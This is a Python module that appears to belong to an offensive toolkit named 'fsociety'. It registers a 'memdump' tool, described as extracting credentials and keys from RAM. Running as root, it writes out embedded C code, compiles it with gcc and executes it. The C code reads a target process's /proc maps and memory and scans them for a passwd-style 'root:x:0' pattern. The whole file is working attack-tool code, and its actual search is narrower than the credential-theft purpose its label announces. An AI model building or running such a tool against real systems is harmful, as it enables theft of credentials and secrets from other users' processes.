from __future__ import annotations
import os
import shutil
import subprocess
from pathlib import Path
from fsociety.core.base import tool
from fsociety.core.logger import Log

C_CODE = r'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

int main(int argc, char *argv[]) {
    if (argc < 2) return 1;
    int pid = atoi(argv[1]);
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 1;
    
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r");
    if (!f) return 1;
    
    char line[512];
    char *buf = malloc(10 * 1024 * 1024);
    while (fgets(line, sizeof(line), f)) {
        unsigned long start, end;
        if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
            if (end - start > 10 * 1024 * 1024) continue;
            if (pread(fd, buf, end - start, start) > 0) {
                for (unsigned long i = 0; i < end - start - 8; i++) {
                    if (memcmp(buf + i, "root:x:0", 8) == 0) {
                        printf("[+] Found /etc/passwd pattern at %lx\n", start + i);
                    }
                }
            }
        }
    }
    free(buf); fclose(f); close(fd);
    return 0;
}
'''

@tool("memdump", "Extract credentials and keys from RAM", category="credential")
class MemDump:
    @staticmethod
    def build_parser(p):
        p.add_argument("pid", type=int, help="Target PID")

    @staticmethod
    def run(args, log: Log) -> int:
        if os.geteuid() != 0:
            log.err("Requires root.")
            return 1
        src = Path(__file__).parent / "memdump.c"
        bin_path = Path(__file__).parent / "memdump_bin"
        src.write_text(C_CODE)
        
        if not bin_path.exists():
            subprocess.run(["gcc", "-O3", str(src), "-o", str(bin_path)])
            
        subprocess.run([str(bin_path), str(args.pid)])
        return 0
